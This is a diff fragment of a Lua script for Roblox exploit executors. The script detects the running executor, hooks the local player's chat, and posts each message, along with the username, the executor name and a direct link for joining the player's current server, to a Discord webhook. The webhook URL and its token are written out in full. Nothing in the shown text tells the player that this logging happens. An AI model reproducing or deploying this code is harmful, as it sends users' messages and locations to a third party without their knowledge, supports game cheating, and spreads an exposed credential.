@@ -1,5 +1,5 @@
 local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or  getexecutorname() and "Scriptware"
-local url = "https://discord.com/api/webhooks/931742812985229322/gkvGkILBnUAxagl90O6VAuDyc5evlS3WciRVZJ27slGCQ3mXuCkFzQXvpKL6vZydBwrh"
+local url = "https://discord.com/api/webhooks/931742812985229322/gkvGkILBnUAxagl90O6VAuDyc5evlS3WciRVZJ27slGCQ3mXuCkFzQXvpKL6vZydBwrh" -- you have no life if ur gonna annoy me fr. (please dont)
 
 local Players = game:GetService("Players")
 Players.LocalPlayer.Chatted:Connect(function(msg)
@@ -17,7 +17,7 @@ local data = {
 ["embeds"] = {
     {
         ["title"] = "**"..game.Players.LocalPlayer.Name.." Is Trying To Send A Message!**",
-        ["description"] = "\n Join Code:\n https://roblox.com/discover#/rg-join/"..game.PlaceId.."/"..game.JobId.." \n \n Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."\n**Message:**"..(table.concat(args, " ")).."** \n \n Avater:",
+        ["description"] = "\n Join Code:\n https://roblox.com/discover#/rg-join/"..game.PlaceId.."/"..game.JobId.." \n \n Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."\n**Message: **"..(table.concat(args, " ")).."** \n \n Avater:",
         ["type"] = "rich",
         ["color"] = tonumber(0x7269da),
         ["image"] = {
